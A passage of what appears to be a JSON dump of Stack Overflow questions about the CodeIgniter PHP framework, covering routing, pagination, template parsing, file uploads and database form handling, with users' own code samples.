do?</p>\n"},{"tags":["parsing","templates","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1028,"score":1,"question_id":6619523,"title":"Extended Template Parser: CodeIgniter... Issue with Nested Arrays","body":"<p>I'm currently using the <a href=\"http://codeigniter.com/forums/viewthread/155859/\" rel=\"nofollow\">Extended Template Parser Library</a> for CodeIgniter. I'm running into issues when trying to template-parse nested arrays. Here is the array I am feeding the view:</p>\n\n<pre><code> Array\n    (\n                [users] =&gt; Array\n                    (\n                        [0] =&gt; Array\n                            (\n                                [id] =&gt; 42\n                                [username] =&gt; jordanarseno\n                                [posts] =&gt; Array\n                                    (\n                                        [0] =&gt; Array\n                                            (\n                                                [id] =&gt; 1354\n                                                [title] =&gt; foo\n                                            )\n                                        [1] =&gt; Array\n                                            (\n                                                [id] =&gt; 1350\n                                                [title] =&gt; bar\n                                            )\n                                    )\n                            )\n                    ) \n    )\n</code></pre>\n\n<p>I am able to render the <strong>users</strong> details...<code>{username}</code>, <code>{firstname}</code> etc. But I am not able to render the <strong>posts</strong> details.</p>\n\n<p>My template code is straightforward and the following:</p>\n\n<pre><code>{users}\n    {username}\n    {posts}\n        {title}\n    {/posts}\n{/users}\n</code></pre>\n\n<p>PHP throws the following errors:</p>\n\n<blockquote>\n  <p>A PHP Error was encountered Severity:\n  Warning Message: preg_match_all()\n  [function.preg-match-all]: Compilation\n  failed: nothing to repeat at offset 2\n  Filename: libraries/Parser.php Line\n  Number: 474</p>\n</blockquote>\n\n<p>I'm beginning to think that the library does not support nested arrays insofar as <em>multiple</em> sub arrays as I need. The library comes with many tests. There is a specific test that takes:</p>\n\n<pre><code> [posts] =&gt; Array\n        (\n            [0] =&gt; Array\n                (\n                    [title] =&gt; first post\n                    [paras] =&gt; Array\n                        (\n                            [main] =&gt; foo\n                            [short] =&gt; bar\n                        )\n\n                )\n</code></pre>\n\n<p>And renders it in the view properly. However, as you can see, My requirements are that it go in one layer further.</p>\n\n<p>Does anybody else use this library and have you run into similar issues?\nIf not, what do you use for CodeIgniter template parsing? How nested will it go? I'm open to all suggestions and will move to another library if needed.</p>\n"},{"tags":["security","codeigniter","directory","traversal","sanitize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13248849,"title":"CodeIgniter - Directory Traversal - sanitize_filename()","body":"<p>If I use the CodeIgniter File Upload Class and rename the image being uploaded using:</p>\n\n<p><code>$config['file_name']</code></p>\n\n<p>do I still have to use</p>\n\n<p><code>$this-&gt;security-&gt;sanitize_filename()</code></p>\n\n<p>on the image being uploaded by user?</p>\n"},{"tags":["codeigniter","rackspace-cloud"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13244621,"title":"Uploading file to the cloud using cloudmanic-storage","body":"<p>I'm trying to upload my files from the server to the CDN by using codeigniter and the cloudmanic-storage library. The functions for creating/listing containers work, but the one for adding files to the container does not.</p>\n\n<p>I have no idea what is wrong with it or how to fix this issues, so if anyone has come along this problem it will be great to share some knowledge :)</p>\n\n<pre><code>$container = 'cm-storage-' . time();\n    echo '&lt;h1&gt;Create test container.&lt;/h1&gt;';\n    $this-&gt;storage-&gt;create_container($container, 'private');\n    echo \"New container: &lt;b&gt;$container&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;\";\n    echo '&lt;hr /&gt;';\n            $file = \"_data/articlepics/big_\".$config['file_name'];\n    $this-&gt;storage-&gt;upload_file($container, $file, 'test01.jpg');\n</code></pre>\n\n<p>I'm sure that the file that I'm trying to upload exists, the problem also persists when i try it out with the example controller. It just doesn't want to upload the files to the CDN for some reason.</p>\n\n<p>Codeigniter ver.2.0.2\nLatest cloudmanic-storage from github</p>\n"},{"tags":["php","codeigniter","url"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":13237051,"title":"How can enable users switching between languages with URI Language Identifier","body":"<p>I'm using this <a href=\"https://github.com/EllisLab/CodeIgniter/wiki/URI-Language-Identifier\" rel=\"nofollow\">URI Language Identifier</a> </p>\n\n<pre><code>http://localhost/internationalisation/index.php/en/\nhttp://localhost/internationalisation/index.php/en/welcome/\nhttp://localhost/internationalisation/index.php/en/contact/\nhttp://localhost/internationalisation/index.php/es/\nhttp://localhost/internationalisation/index.php/es/welcome/\n</code></pre>\n\n<p>I've set <code>$config['lang_ignore'] = FALSE;</code> so the URL shows what language I'm currently using like above.</p>\n\n<p>Question: How can enable users switching between languages?</p>\n\n<p>These codes in View won't work:</p>\n\n<pre><code>&lt;a href=\"&lt;?php echo site_url('en'); ?&gt;\"&gt;English&lt;/a&gt;\n&lt;a href=\"&lt;?php echo site_url('es'); ?&gt;\"&gt;Spanish&lt;/a&gt;\n</code></pre>\n\n<p>because they produce links like this:</p>\n\n<pre><code>http://localhost/internationalisation/index.php/en/en\nhttp://localhost/internationalisation/index.php/en/es\n</code></pre>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":1494,"score":1,"question_id":9667226,"title":"Remove index.php in codeigniter 2.1.0","body":"<p>I tried everything on google related to removing index.php from URL in codeigniter but no solution worked for me \nI am using codeigniter version 2.1.0\nHow I can remove index form my URL ?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13235556,"title":"Codeigniter 2.1 - file upload, character replace","body":"<p>I have this to functions:</p>\n\n<p>This one is for image upload:</p>\n\n<pre><code>   function img_upload($folder) {\n            $this-&gt;path = './public/img/' . $folder;\n            $imgs = array();\n            $count = 0;\n            foreach ($_FILES as $key =&gt; $value) {\n                $img_name = $this-&gt;char_replace($value['name'][$count], '_');\n                $count++;\n                $config = array(\n                'allowed_types' =&gt; 'jpg|jpeg|png|gif',\n                'upload_path' =&gt; $this-&gt;path,\n                'file_name' =&gt; $img_name\n            );\n                $this-&gt;CI-&gt;load-&gt;library('upload', $config);\n              if($key != 'logo') :\n                  if (!$this-&gt;CI-&gt;upload-&gt;do_upload($key)) {\n                } else {\n                    $q = $this-&gt;CI-&gt;upload-&gt;data();\n                    $config['image_library'] = 'gd2';\n                    $config['source_image'] = $this-&gt;path . '/' . $q['file_name'];\n                    $config['new_image'] = $this-&gt;path . '/thumbs';\n                    $config['create_thumb'] = FALSE;\n                    $config['maintain_ratio'] = TRUE;\n                    $config['width'] = 128;\n                    $config['height'] = 128;\n\n                    $this-&gt;CI-&gt;load-&gt;library('image_lib');\n                    $this-&gt;CI-&gt;image_lib-&gt;clear();\n                    $this-&gt;CI-&gt;image_lib-&gt;initialize($config);\n                    $this-&gt;CI-&gt;image_lib-&gt;resize();\n                    array_push($imgs, $q['file_name']);\n                }\n              endif;\n            }\n</code></pre>\n\n<p>And this one is for replacing characters:</p>\n\n<pre><code>function char_replace($text, $rep_simbol = \" \")\n    {\n        $char = array('!', '&amp;', '?', '/', '/\\/', ':', ';', '#', '&lt;', '&gt;', '=', '^', '@', '~', '`', '[', ']', '{', '}');\n        return $name = str_replace($char, $rep_simbol, $text);\n    }\n</code></pre>\n\n<p>Uploading is working great, but character replacement no quite. It is using only first letter from the name of file that is uploading, and rest is cut off? What is wrong here?</p>\n"},{"tags":["codeigniter","codeigniter-2","codeigniter-url","codeigniter-routing"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":13246286,"title":"How to route 2 parameters to a controller?","body":"<p>This seems really basic but i can't get the hang of it.</p>\n\n<p>I'm trying to send more then one parameter to a method in the controller, like this :</p>\n\n<pre><code>http://localhost/ci/index.php/subjects/3/state\n</code></pre>\n\n<p>This is the routings i've tried :</p>\n\n<pre><code>$route['subjects/(:num)'] = 'subjects/view/$1';\n$route['subjects/(:num)/{:any}'] = 'subjects/view/$1/$2';\n</code></pre>\n\n<p>the method accepted 2 paremeters :</p>\n\n<pre><code>public function view($slug, $id = null){\n\n}\n</code></pre>\n\n<p>but i seem to get a 404. How can i get this to work? i need the view method to always accept 1 parameter and optional other parameters.</p>\n\n<p><strong>NOTE</strong> : I am including the url helper.</p>\n"},{"tags":["php","codeigniter","charts","google-analytics","google-analytics-api"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":21,"score":-2,"question_id":13245957,"title":"Add woopra plugin to code igniter","body":"<p>My task is to add woopra(charts,etc) to a website using code igniter framework. Unfortunately,I KNOW NOTHING about this woopra and all search result Im getting from the internet is always about integrating woopra to wordpress.</p>\n\n<p>Im soliciting some links, sample codes,demos, or anything that can help me about this woopra thing.\nAny response is highly appreicated. thank you.</p>\n"},{"tags":["php","codeigniter","twitter-api"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13245473,"title":"Implementing Twitter Login in CodeIgniter","body":"<p>I want to implement a Twitter login in my project. My project is coded in CodeIgniter.\nCan somebody give me a step by step process to implement this?</p>\n"},{"tags":["sql","codeigniter","error-handling"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":22,"score":-2,"question_id":13244343,"title":"data inside table wont appear","body":"<p>i have tried to make edit option, firstly, i must make my data appear on th table but my data wont appear.</p>\n\n<pre><code>function edit($id_publisher=null){\nif (!empty($_POST['submit'])){\n\n         $id_label=$_POST['id_label'];\n         $artis=$_POST['artis'];\n         $publisher=$_POST['publisher'];\n\n         $a = array('id_label'=&gt;$id_label,'artis'=&gt;$artis,'publisher'=&gt;$publisher);\n         $this-&gt;db-&gt;where('id_publisher',$id_publisher);\n         $this-&gt;db-&gt;update('t_publisher',$a);\n         redirect(\"mapping/mapp\");\n        }else{\n         $data['data'] = $this-&gt;db-&gt;query(\"SELECT b.id_publisher, a.label,  b.artis, b.publisher from t_label a, t_publisher b where a.id_label=b.id_label\")-&gt;row();\n         $this-&gt;load-&gt;view('edit',$data);\n          }\n\n        }\n</code></pre>\n\n<p>whats wrong with my code?\nhelp, please :)</p>\n\n<p>this is the views' code</p>\n\n<pre><code>&lt;form action=\"&lt;?php echo base_url().\"mapping/edit/\".$data-&gt;ID_PUBLISHER;?&gt;\" method=\"POST\"&gt;\n    &lt;table border=\"2\" align=\"center\"&gt;\n        &lt;tr&gt;\n            &lt;td&gt;LABEL&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"label\" value=\"&lt;?php echo $data-&gt;LABEL; ?&gt;\"/&gt;&lt;td&gt;&lt;/tr&gt;\n            &lt;td&gt;ARTIS&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"artis\" value=\"&lt;?php echo $data-&gt;ARTIS; ?&gt;\"/&gt;&lt;td&gt;&lt;/tr&gt;\n            &lt;td&gt;PUBLISHER&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"publisher\" value=\"&lt;?php echo $data-&gt;PUBLISHER; ?&gt;\"/&gt;&lt;td&gt;&lt;/tr&gt;\n            &lt;td colspan=\"2\" align=\"center\"&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Edit\" /&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/table&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":564,"score":0,"question_id":10176518,"title":"CodeIgniter pagination url page number","body":"<p>From what I saw, CodeIgniter's pagination is counting the page wrong way, because I got pagination looking like this: </p>\n\n<blockquote>\n  <p><strong>1</strong> 2 3 ></p>\n</blockquote>\n\n<p>And its good, the problem is in the each pagination number url, except the first one:</p>\n\n<p>Number <strong>2</strong> from the pagination has the following url:</p>\n\n<blockquote>\n  <p><a href=\"http://my-url.com/index.php/page/\" rel=\"nofollow\">http://my-url.com/index.php/page/</a><strong>1</strong></p>\n</blockquote>\n\n<p>And number <strong>3</strong> has the following url:</p>\n\n<blockquote>\n  <p><a href=\"http://my-url.com/index.php/page/\" rel=\"nofollow\">http://my-url.com/index.php/page/</a><strong>2</strong></p>\n</blockquote>\n\n<p>So, the number is URL is decreased by 1 everytime.</p>\n\n<p>How can I solve that, so the page numbers in urls will be the same as the page numbers in the pagination?</p>\n\n<p>My pagination config:</p>\n\n<pre><code>$config['per_page']    = 5;\n$config['base_url']    = site_url('page');\n$config['uri_segment'] = 2;\n$page = $this-&gt;uri-&gt;segment(2);\n$total_rows_array = $this-&gt;records-&gt;get($config['per_page'], $page * $config['per_page']); // parameters: limit, offset.\n$config['total_rows']  = count($total_rows_array);\n</code></pre>\n"},{"tags":["php","codeigniter","zend-framework","codeigniter-2","barcode"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13243656,"title":"codeigniter + zend barcode class","body":"<p>I integrated the Zend_Barcode class by placing <strong>Zend</strong> directory on <em>application/libraries</em>. </p>\n\n<p>Under my controller:</p>\n\n<pre><code>  public function barcode_gen()\n  {\n    $this-&gt;load-&gt;library('Zend/Barcode/Barcode');\n    $barcodeOptions = array('text' =&gt; 'ZEND-FRAMEWORK');\n    $rendererOptions = array();\n    Zend_Barcode::factory('code39', 'image', $barcodeOptions, $rendererOptions)-&gt;render();\n  }\n</code></pre>\n\n<p>However, this results into:</p>\n\n<pre><code>Non-existent class: Barcode\n</code></pre>\n\n<p>I've also read lots of tutorial but never figured out how to, some tuts are quite outdated.</p>\n\n<p>Even if I followed this thread on <a href=\"http://codeigniter.com/forums/viewthread/166294/\" rel=\"nofollow\">CI forums</a>, no luck.</p>\n"},{"tags":["codeigniter","table"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13243418,"title":"How to load the table templates for tabular data in CodeIgniter","body":"<p>I am trying to reuse a table template for the table library in multiple pages. I have tried to save the template in a *php file to later call it as an include but that isn't working. My code looks like this:</p>\n\n<pre><code>//on the controller\n$this-&gt;load-&gt;view('includes/tabularDataTemplate.php');\n\n//this is the contents of the tabularDataTemplate.php file    \n$tmpl = array (\n    'table_open'          =&gt; '&lt;table border=\"1\" cellpadding=\"4\" cellspacing=\"0\"&gt;',\n\n    'heading_row_start'   =&gt; '&lt;tr&gt;',\n    'heading_row_end'     =&gt; '&lt;/tr&gt;',\n    'heading_cell_start'  =&gt; '&lt;th&gt;',\n    'heading_cell_end'    =&gt; '&lt;/th&gt;',\n\n    'row_start'           =&gt; '&lt;tr&gt;',\n    'row_end'             =&gt; '&lt;/tr&gt;',\n    'cell_start'          =&gt; '&lt;td&gt;',\n    'cell_end'            =&gt; '&lt;/td&gt;',\n\n    'row_alt_start'       =&gt; '&lt;tr&gt;',\n    'row_alt_end'         =&gt; '&lt;/tr&gt;',\n    'cell_alt_start'      =&gt; '&lt;td&gt;',\n    'cell_alt_end'        =&gt; '&lt;/td&gt;',\n\n    'table_close'         =&gt; '&lt;/table&gt;'\n    );\n\n$this-&gt;table-&gt;set_template($tmpl);\n</code></pre>\n\n<p>I am sure there has to be a better (working) way to achieve this.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["php","codeigniter","output-buffering"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":136,"score":0,"question_id":9931471,"title":"How do ob_start and extract function together?","body":"<p>I've noticed that a lot of frameworks/blogging engines/etc. use ob_start to produce their output and that variables that are to be passed to the template have <code>extract</code> called on them just before <code>ob_start</code> is called. </p>\n\n<p>I'm guessing that the buffered output has access to any variables created with <code>extract</code> but I can't find any specific documentation on this.</p>\n\n<p>Example from Codeigniter (some comments removed from the original code for brevity):</p>\n\n<pre><code>extract($this-&gt;_ci_cached_vars);\n\nob_start();\n\n// If the PHP installation does not support short tags we'll\n// do a little string replacement, changing the short tags\n// to standard PHP echo statements.\nif ( ! is_php('5.4') &amp;&amp; (bool) @ini_get('short_open_tag') === FALSE &amp;&amp; config_item('rewrite_short_tags') == TRUE)\n{\necho eval('?&gt;'.preg_replace('/;*\\s*\\?&gt;/', '; ?&gt;', str_replace('&lt;?=', '&lt;?php echo ', file_get_contents($_ci_path))));\n}\nelse\n{\ninclude($_ci_path); // include() vs include_once() allows for multiple views with the same name\n}\n</code></pre>\n\n<p>So, this is basically extracting a set of variables that were passed in as an array and then using <code>ob_start</code> to buffer some output (basically just an include to output a particular view). In most cases the view/template that's being included has references to the variables extracted just before ob_start.</p>\n\n<p>Is this how ob_start works? does it have access to variables declared within the scope that it is used? If I declare <code>$test = \"hello\"</code> just before ob_start, will I be able to use $start in the view and have it output \"hello\"?</p>\n"},{"tags":["php","codeigniter","http-status-code-404","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":589,"score":0,"question_id":10008662,"title":"Codeigniter 2.1 controller not found","body":"<p>I have conroller <code>baner</code>, and when I try to run it (run upload function <code>http://localhost/010/baner/upload_img</code>), I got 404 error:</p>\n\n<blockquote>\n  <p>The page you requested was not found</p>\n</blockquote>\n\n<p>What is wrong here?</p>\n\n<p>The controller:</p>\n\n<pre><code>&lt;?php \nif (!defined('BASEPATH'))\nexit('No direct script access allowed');\n\nclass Upload_Baner extends CI_Controller {\n\n    protected $path_img_upload_folder;\n    protected $path_img_thumb_upload_folder;\n    protected $path_url_img_upload_folder;\n    protected $path_url_img_thumb_upload_folder;\n\n    protected $delete_img_url;\n\n  function __construct() {\n        parent::__construct();       \n\n        $this-&gt;setPath_img_upload_folder(\"public/img/promotions/\");\n        $this-&gt;setPath_img_thumb_upload_folder(\"public/img/promotions/thumbnails/\");\n\n        $this-&gt;setDelete_img_url(base_url() . 'upload_baner/deleteImage/');\n\n        $this-&gt;setPath_url_img_upload_folder(base_url() . \"public/img/promotions/\");\n        $this-&gt;setPath_url_img_thumb_upload_folder(base_url() . \"public/img/promotions/thumbnails/\");\n  }\n\n  public function upload_img() {\n\n        //Format the name\n        $name = $_FILES['userfile']['name'];\n        $name = strtr($name, 'ÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃ Ã¡Ã¢Ã£Ã¤Ã¥Ã§Ã¨Ã©ÃªÃ«Ã¬Ã­Ã®Ã¯Ã°Ã²Ã³Ã´ÃµÃ¶Ã¹ÃºÃ»Ã¼Ã½Ã¿', 'AAAAAACEEEEIIIIOOOOOUUUUYaaaaaaceeeeiiiioooooouuuuyy');\n\n        // replace characters other than letters, numbers and . by _\n        $name = preg_replace('/([^.a-z0-9]+)/i', '_', $name);\n\n        //Your upload directory, see CI user guide\n        $config['upload_path'] = $this-&gt;getPath_img_upload_folder();\n\n        $config['allowed_types'] = 'gif|jpg|png|JPG|GIF|PNG';\n        $config['max_size'] = '1000';\n        $config['file_name'] = $name;\n\n       //Load the upload library\n        $this-&gt;load-&gt;library('upload', $config);\n\n       if ($this-&gt;do_upload()) {\n\n            //If you want to resize \n            $config['new_image'] = $this-&gt;getPath_img_thumb_upload_folder();\n            $config['image_library'] = 'gd2';\n            $config['source_image'] = $this-&gt;getPath_img_upload_folder() . $name;\n            $config['create_thumb'] = FALSE;\n            $config['maintain_ratio'] = TRUE;\n            $config['width'] = 193;\n            $config['height'] = 94;\n\n            $this-&gt;load-&gt;library('image_lib', $config);\n\n            $this-&gt;image_lib-&gt;resize();\n\n           $data = $this-&gt;upload-&gt;data();\n\n            //Get info \n            $info = new stdClass();\n\n            $info-&gt;name = $name;\n            $info-&gt;size = $data['file_size'];\n            $info-&gt;type = $data['file_type'];\n            $info-&gt;url = $this-&gt;getPath_img_upload_folder() . $name;\n            $info-&gt;thumbnail_url = $this-&gt;getPath_img_thumb_upload_folder() . $name; //I set this to original file since I did not create thumbs.  change to thumbnail directory if you do = $upload_path_url .'/thumbs' .$name\n            $info-&gt;delete_url = $this-&gt;getDelete_img_url() . $name;\n            $info-&gt;delete_type = 'DELETE';\n\n\n           //Return JSON data\n           if (IS_AJAX) {   //this is why we put this in the constants to pass only json data\n                echo json_encode(array($info));\n                //this has to be the only the only data returned or you will get an error.\n                //if you don't give this a json array it will give you a Empty file upload result error\n                //it you set this without the if(IS_AJAX)...else... you get ERROR:TRUE (my experience anyway)\n            } else {   // so that this will still work if javascript is not enabled\n                $file_data['upload_data'] = $this-&gt;upload-&gt;data();\n                echo json_encode(array($info));\n            }\n        } else {\n\n           // the display_errors() function wraps error messages in &lt;p&gt; by default and these html chars don't parse in\n           // default view on the forum so either set them to blank, or decide how you want them to display.  null is passed.\n            $error = array('error' =&gt; $this-&gt;upload-&gt;display_errors('',''));\n\n            echo json_encode(array($error));\n        }\n\n\n       }  \n\n  public function do_upload() {\n\n        if (!$this-&gt;upload-&gt;do_upload()) {\n\n            return false;\n        } else {\n            //$data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n            return true;\n        }\n     }\n\n\n//Function Delete image\n    public function deleteImage() {\n\n        //Get the name in the url\n        $file = $this-&gt;uri-&gt;segment(3);\n\n        $success = unlink($this-&gt;getPath_img_upload_folder() . $file);\n        $success_th = unlink($this-&gt;getPath_img_thumb_upload_folder() . $file);\n\n        //info to see if it is doing what it is supposed to \n        $info = new stdClass();\n        $info-&gt;sucess = $success;\n        $info-&gt;path = $this-&gt;getPath_url_img_upload_folder() . $file;\n        $info-&gt;file = is_file($this-&gt;getPath_img_upload_folder() . $file);\n        if (IS_AJAX) {//I don't think it matters if this is set but good for error checking in the console/firebug\n            echo json_encode(array($info));\n        } else {     //here you will need to decide what you want to show for a successful delete\n            var_dump($file);\n        }\n    }\n\n    public function get_files() {\n\n        $this-&gt;get_scan_files();\n    }\n\n    public function get_scan_files() {\n\n        $file_name = isset($_REQUEST['file']) ?\n                basename(stripslashes($_REQUEST['file'])) : null;\n        if ($file_name) {\n            $info = $this-&gt;get_file_object($file_name);\n        } else {\n            $info = $this-&gt;get_file_objects();\n        }\n        header('Content-type: application/json');\n        echo json_encode($info);\n    }\n\n    protected function get_file_object($file_name) {\n        $file_path = $this-&gt;getPath_img_upload_folder() . $file_name;\n        if (is_file($file_path) &amp;&amp; $file_name[0] !== '.') {\n\n            $file = new stdClass();\n            $file-&gt;name = $file_name;\n            $file-&gt;size = filesize($file_path);\n            $file-&gt;url = $this-&gt;getPath_url_img_upload_folder() . rawurlencode($file-&gt;name);\n            $file-&gt;thumbnail_url = $this-&gt;getPath_url_img_thumb_upload_folder() . rawurlencode($file-&gt;name);\n            //File name in the url to delete \n            $file-&gt;delete_url = $this-&gt;getDelete_img_url() . rawurlencode($file-&gt;name);\n            $file-&gt;delete_type = 'DELETE';\n\n            return $file;\n        }\n        return null;\n    }\n\n       protected function get_file_objects() {\n        return array_values(array_filter(array_map(\n             array($this, 'get_file_object'), scandir($this-&gt;getPath_img_upload_folder())\n                   )));\n    }\n\n    public function getPath_img_upload_folder() {\n        return $this-&gt;path_img_upload_folder;\n    }\n\n    public function setPath_img_upload_folder($path_img_upload_folder) {\n        $this-&gt;path_img_upload_folder = $path_img_upload_folder;\n    }\n\n    public function getPath_img_thumb_upload_folder() {\n        return $this-&gt;path_img_thumb_upload_folder;\n    }\n\n    public function setPath_img_thumb_upload_folder($path_img_thumb_upload_folder) {\n        $this-&gt;path_img_thumb_upload_folder = $path_img_thumb_upload_folder;\n    }\n\n    public function getPath_url_img_upload_folder() {\n        return $this-&gt;path_url_img_upload_folder;\n    }\n\n    public function setPath_url_img_upload_folder($path_url_img_upload_folder) {\n        $this-&gt;path_url_img_upload_folder = $path_url_img_upload_folder;\n    }\n\n    public function getPath_url_img_thumb_upload_folder() {\n        return $this-&gt;path_url_img_thumb_upload_folder;\n    }\n\n    public function setPath_url_img_thumb_upload_folder($path_url_img_thumb_upload_folder) {\n        $this-&gt;path_url_img_thumb_upload_folder = $path_url_img_thumb_upload_folder;\n    }\n\n    public function getDelete_img_url() {\n        return $this-&gt;delete_img_url;\n    }\n\n    public function setDelete_img_url($delete_img_url) {\n        $this-&gt;delete_img_url = $delete_img_url;\n    }\n\n\n}\n</code></pre>\n"},{"tags":["php","asp.net-mvc","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":181,"score":1,"question_id":10263341,"title":"Link to a Controller function with parameter from a View (CodeIgniter)","body":"<p>Using CodeIgniter I am trying to create a link that the user can click within a view to show them the details of a record in my database.</p>\n\n<p>In ASP.NET MVC3 with C# I would do it with <code>@Html.ActionLink(\"Controller\", \"Action\", new { id = item.Id})</code></p>\n\n<p>This is my session controllers index() function</p>\n\n<pre><code>public function index()\n{\n        $data['sessions'] = $this-&gt;session_model-&gt;get_sessions();\n\n        $this-&gt;load-&gt;view('_header');\n        $this-&gt;load-&gt;view('session/index', $data);\n        $this-&gt;load-&gt;view('_footer');\n}\n</code></pre>\n\n<p>This is the index view it loads where I want to be able to click the link to go to enter() function</p>\n\n<pre><code>&lt;table&gt;\n\n&lt;th&gt;Session Name&lt;/th&gt;\n&lt;th&gt;Description&lt;/th&gt;\n&lt;th&gt;Host&lt;/th&gt;\n&lt;th&gt;&lt;/th&gt;\n\n&lt;?php foreach ($sessions as $session_item): ?&gt;\n    &lt;tr&gt;\n        &lt;td&gt; &lt;?php echo $session_item['sessionName'] ?&gt; &lt;/td&gt;\n        &lt;td&gt; &lt;?php echo $session_item['sessionDesc'] ?&gt; &lt;/td&gt;\n        &lt;td&gt; &lt;?php echo $session_item['adminName'] ?&gt; &lt;/td&gt;\n        &lt;td&gt; &lt;a id=\"enterSession\" href=&lt;?php echo site_url(\"session/enter\" + $session_item['id']) ?&gt; &gt;Enter&lt;/a&gt;&lt;/td&gt;\n\n    &lt;/tr&gt;\n&lt;?php endforeach ?&gt;\n</code></pre>\n\n<p></p>\n\n<p>The enter session points me to the url \"http://192.168.1.36/index.php/1\" (if the id of my item is 1) whereas I expect \"http://192.168.1.36/index.php/session/enter/1\"</p>\n\n<p>Any ideas on how I can make it call the enter() function also in the session controller (shown below)</p>\n\n<pre><code> public function enter($id) {\n\n        $this-&gt;load-&gt;view('_header');\n        $this-&gt;load-&gt;view('session/enter');\n        $this-&gt;load-&gt;view('_footer');\n    }\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":13243281,"title":"Submitting basic input to database Codeigniter","body":"<p>So, all I'm trying to do is submit a few values to a database from form input.</p>\n\n<p>I have a controller <strong>clientcreation.php</strong>:</p>\n\n<pre><code>&lt;?php\n\nclass Clientcreation extends CI_Controller\n{\n  function index(){\n     $this-&gt;load-&gt;view('files/header',$clientRegistration);\n     $this-&gt;load-&gt;view('files/navigation');\n     $this-&gt;load-&gt;view('pages/clientcreation');\n     $this-&gt;load-&gt;view('files/footer');\n\n    ## validation rules here working fine.\n\n     $this-&gt;form_validation-&gt;set_rules($RegistrationRequiredFields);\n        ## Perform Validation\n        if ($this-&gt;form_validation-&gt;run() == FALSE){\n             echo validation_errors();             ## show the errorneous fields\n        }\n\n    else{\n            #### load :: models\n            $this-&gt;load-&gt;model('pages/clientcreationmodel','',TRUE);\n                ## get [hashed] inputted pass and submit.\n                $this-&gt;Clientcreationmodel-&gt;hashed_client_pass_and_submit();\n            # then, load success page:\n            $this-&gt;load-&gt;view('pages/success/clientRegistrationSuccess');\n    }\n\n\n\n  }\n\n}\n</code></pre>\n\n<p>a model <strong>clientcreationmodel.php</strong>:</p>\n\n<pre><code>&lt;?php\nclass Clientcreationmodel extends CI_Model{\n    function __construct()\n    {\n        // Call the Model constructor\n        parent::__construct();\n    }\n\n    function hashed_client_pass_and_submit(){\n        ## create hashed version of client inputted [pass]\n    /*    \n        $initialVal = $_POST['pass'];\n        $HashedPassVal = hash('sha512', $initialVal);\n        $SaltValue = mcrypt_create_iv(10, MCRYPT_DEV_URANDOM);\n        $finalHashedValue = $HashedPassVal.$SaltValue;\n    */    \n        ## process and insert into db\n        $this-&gt;input-&gt;post('email', TRUE);     \n        $this-&gt;input-&gt;post('pass', TRUE);\n        $this-&gt;input-&gt;post('fname', TRUE);\n        $this-&gt;input-&gt;post('lname', TRUE);\n        $this-&gt;input-&gt;post('title', TRUE);\n        $this-&gt;input-&gt;post('co', TRUE);\n        $this-&gt;input-&gt;post('phone', TRUE);\n        $this-&gt;input-&gt;post('state', TRUE);  \n        $this-&gt;input-&gt;post('numapps', TRUE);\n        $this-&gt;input-&gt;post('versCntrl', TRUE);\n        $this-&gt;input-&gt;post('testFreq', TRUE);\n        $this-&gt;input-&gt;post('submit');\n\n        $this-&gt;db-&gt;insert('client', $this);\n   }\n\n}\n?&gt;\n</code></pre>\n\n<p>a view <strong>clientcreation.php</strong>:</p>\n\n<pre><code>&lt;?php\n    echo form_open('index/pages/clientcreation',$CustCreationFormAttr);\n    echo form_label('Email: ','email');\n        echo form_input($CustCreationEmail);echo '&lt;br&gt;';\n    echo form_label('Password: ', 'pass');echo '&lt;br&gt;';\n        echo form_password($CustCreationPassword);echo '&lt;br&gt;';\n    echo form_label('Password Confirm: ', 'passConf');echo '&lt;br&gt;';\n        echo form_password($CustCreationConfPassword);echo '&lt;br&gt;';\n    echo form_label('First Name: ','fname');echo '&lt;br&gt;';\n            echo form_input($CustCreationFirstName);echo '&lt;br&gt;';\n    echo form_label('Last Name: ','lname');echo '&lt;br&gt;';\n            echo form_input($CustCreationLastName);echo '&lt;br&gt;';\n    echo form_label('Title: ', 'title');echo '&lt;br&gt;';\n            echo form_input($CustCreationClientTitle);echo '&lt;br&gt;';\n    echo form_label('Company: ', 'co');echo '&lt;br&gt;';\n            echo form_input($CustCreationCompany);echo '&lt;br&gt;';\n        echo form_label('Phone: 